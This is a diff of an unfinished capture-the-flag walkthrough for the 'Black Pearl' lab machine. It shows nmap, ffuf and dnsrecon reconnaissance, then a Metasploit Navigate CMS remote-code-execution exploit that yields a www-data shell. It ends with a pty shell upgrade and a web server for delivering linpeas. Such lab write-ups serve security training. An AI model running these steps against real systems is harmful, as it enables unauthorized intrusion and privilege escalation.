@@ -24,11 +24,11 @@ The -r tells netdiscover to roam around the network, asking, "Hey, who's here?" 
 
 
 ```
-
+## Scanning
 Let's start with **nmap**
 
 ```
-$ nmap -p- -A -T4 -O -v 192.168.57.6 
+$ nmap -p- -A -T4 -O -v 192.***.*.**
 
 
 -p-: Scans all 65,535 ports.
@@ -41,25 +41,10 @@ $ nmap -p- -A -T4 -O -v 192.168.57.6
 Result :
 
 ```
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 05:25 UTC
-NSE: Loaded 156 scripts for scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 05:25
-Completed NSE at 05:25, 0.00s elapsed
-Initiating NSE at 05:25
-Completed NSE at 05:25, 0.00s elapsed
-Initiating NSE at 05:25
-Completed NSE at 05:25, 0.00s elapsed
-Initiating ARP Ping Scan at 05:25
-Scanning 192.168.57.6 [1 port]
-Completed ARP Ping Scan at 05:25, 0.14s elapsed (1 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 05:25
-Completed Parallel DNS resolution of 1 host. at 05:25, 13.00s elapsed
-Initiating SYN Stealth Scan at 05:25
-Scanning 192.168.57.6 [65535 ports]
-Discovered open port 80/tcp on 192.168.57.6
-Discovered open port 53/tcp on 192.168.57.6
-Discovered open port 22/tcp on 192.168.57.6
+
+Discovered open port 80/tcp on 
+Discovered open port 53/tcp on 
+Discovered open port 22/tcp on 
 SYN Stealth Scan Timing: About 44.54% done; ETC: 05:26 (0:00:39 remaining)
 Completed SYN Stealth Scan at 05:26, 68.13s elapsed (65535 total ports)
 Initiating Service scan at 05:26
@@ -73,7 +58,7 @@ Initiating NSE at 05:27
 Completed NSE at 05:27, 0.11s elapsed
 Initiating NSE at 05:27
 Completed NSE at 05:27, 0.01s elapsed
-Nmap scan report for 192.168.57.6
+Nmap scan report for 192.***.**.*
 Host is up (0.0059s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -103,7 +88,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   5.88 ms 192.168.57.6
+1   5.88 ms 192.***.**.*
 
 NSE: Script Post-scanning.
 Initiating NSE at 05:27
@@ -122,7 +107,7 @@ Nmap done: 1 IP address (1 host up) scanned in 98.52 seconds
 Now let's do a quick scan to identify the versions
 
 ```
-$ nmap -sV -T4 192.168.57.6 
+$ nmap -sV -T4 [Target Ip] 
 
 
 -sV: Detects the versions of services running on open ports.
@@ -132,7 +117,7 @@ Results :
 
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 05:36 UTC
-Nmap scan report for 192.168.57.6
+Nmap scan report for 192.***.***.***
 Host is up (0.00080s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -159,7 +144,7 @@ Okay so we got ssh,DNS,http
 Let's check the website 
 
 ```
-http://192.168.57.6
+http://[target ip]
 ```
 
 We will see Nginx website there is nothing valuable on the website
@@ -174,8 +159,271 @@ Okay we got some info now what can we do next ?
 let's try to do **directory hunting** 
 
 ```
-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.6/FUZZ
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://[Targetip]/FUZZ
+
+ffuf (Fuzz Faster U Fool), a web fuzzing tool, to discover directories and files on a web server.
+
+-w : path  to your wordlists
+
+-u : The URL to be Fuzzed
+
+```
+## Result :
+
+```
+ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ  -u http://[Target Ip]/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://[Target IP]/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 62ms]
+#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 60ms]
+#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 63ms]
+#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 84ms]
+# Copyright 2007 James Fisher [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 84ms]
+# directory-list-2.3-medium.txt [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 84ms]
+# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 85ms]
+# This work is licensed under the Creative Commons  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 85ms]
+# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 85ms]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 85ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 86ms]
+#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 87ms]
+# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 88ms]
+# on atleast 2 different hosts [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 88ms]
+secret                  [Status: 200, Size: 209, Words: 31, Lines: 9, Duration: 84ms]
+                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 54ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 281 req/sec :: Duration: [0:08:22] :: Errors: 0 ::
+
+```
+- secret
+
+Okay we found a file called **secret** which is downloadable and it say's 
+
+```
+OMG you got r00t !
+
+Just kidding...search somewhere else. Directory Busting wont give anything.
+
+<This message is here so that you don't waste more time directory busting this particular website.>
+
+
+-Alek
+
+
+```
+Okay Alek !
+
+Next We will perfrom **dnsrecon**
+
+
+
+```
+dnsrecon -r 127.0.0.0/25 -n [blackpearl ip] -d blah
+
+dnsrecon is a DNS (Domain Name System) reconnaissance tool used to gather information about a domain's DNS records.
+
+-r 127.0.0.0/25: Range of IP addresses to scan (subnet range).
+
+-n [blackpearl ip]: Specify the nameserver IP to query.
+
+-d blah: Domain name to target (here, "Type anything it will work")
+
+
 ```
 
+ we got **"backpearl.tcm @ 127.0.0.1"**
 
-Writing ....!!
+ Now to connect to this website we have to add that to our dns > **/etc/hosts**
+
+ ```
+ nano /etc/hosts/
+ 
+ ```
+ Just under Your machines[Kali linux Ip]
+ Add this line :
+
+ ```
+ [Target iP] blackpearl.tcm
+ ```
+
+restart your browser and try visiting this site
+
+```
+http://blackpearl.tcm
+
+```
+- php 7.3
+let's fuzz this directory again
+
+```
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
+
+```
+## Result :
+
+```
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ  -u http://blackpearl.tcm/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://blackpearl.tcm/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+#                       [Status: 200, Size: 86784, Words: 4212, Lines: 1040, Duration: 32ms]
+# This work is licensed under the Creative Commons  [Status: 200, Size: 86783, Words: 4212, Lines: 1040, Duration: 32ms]
+# directory-list-2.3-medium.txt [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 126ms]
+# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 64ms]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 79ms]
+# Copyright 2007 James Fisher [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 170ms]
+#                       [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 262ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 275ms]
+#                       [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 324ms]
+# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 290ms]
+# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 328ms]
+# on atleast 2 different hosts [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 328ms]
+#                       [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 407ms]
+                        [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 411ms]
+navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 131ms]
+                        [Status: 200, Size: 86817, Words: 4212, Lines: 1040, Duration: 284ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+
+```
+As Heath said **"Navigate to navigate"**
+
+We will see a **Navigate Login ** website
+
+
+```
+/navigate/login.php
+
+Navigate CMS is a content management system designed to help users create, manage, and update digital content on websites without needing advanced technical knowledge.
+```
+
+Well you can try to bruteforce the login page using known user names like alek,blackpearl something .
+
+Now while searching in Google, searchploit & Rapid7 we found 
+
+**Navigate CMS -(Unauthenticated) Remote Code Execution**
+
+We will search for it in **Metasploit**
+
+Start Metasploit :
+
+```
+msfconsole
+```
+Search navigate CMS:
+
+```
+msf5 > search navigate
+```
+You will find 
+
+```
+exploit/multi/http/ navigate_cms_rce
+```
+Okay now you can use & set the rhosts,vhost 
+
+```
+| msf5 > use exploit/multi/http/ navigate_cms_rce
+
+| msf5 exploit(multi/http/navigate_cms_rce) > options
+
+| msf5 exploit(multi/http/navigate_cms_rce) > set rhosts [black pearl ip]
+
+| msf5 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
+
+
+| msf5 exploit(multi/http/navigate_cms_rce) > run
+```
+We have a meterpreter session running ! Good
+
+```
+meterpreter > shell 
+
+whoami
+www-data
+```
+
+Okay now we are in  but we are just on the **www-data** and we have to do **privilege escalation** 
+
+Now we need to get a shell but how ?
+
+You can check if they have python installed if thet have then we can generate a tty shell using a one liner code found online
+
+check by typing :
+
+```
+which python
+
+[It will return the python version if they have installed it]
+```
+
+Type this code to generate the tty shell to know more about it click [**here**](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
+
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")' 
+
+
+This command is like telling Python to open a secret doorway (pty.spawn) into the /bin/sh shell. It's a quick way to upgrade a basic shell into something more interactive and user-friendly, like going from a tricycle to a sports car—still a ride, but way more fun!
+```
+
+Okay Now we got a shell back 
+
+Open a new **Terminal** in Kali Linux 
+
+we can use the script called **linpeas**.
+
+```
+linpeas.sh is a script used in cybersecurity to find potential vulnerabilities and misconfigurations on Linux systems. It's like a detective that quickly scans the system, looking for clues that could help an attacker gain more control or information.
+
+This is for doing linux privilege escalation and if you were to go for windows privilege escalation you can search for winPeas 
+```
+
+We can try to send the **linpeas.sh**
+First git clone the **"linpeas.sh"** script or  (Find the latest version) from [**here**]https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1 Download it manually :)
+
+After downloading move the linpeas.sh file to your folder where you want to host it 
+
+You can host up a webserver from your attacker machine using **python3**
+(Check if **linpeas.sh** is present in your folder or not)
+```
+python3 -m http.server 80 
+```
+Okay now you have setup the server
+
+
+Writing.....
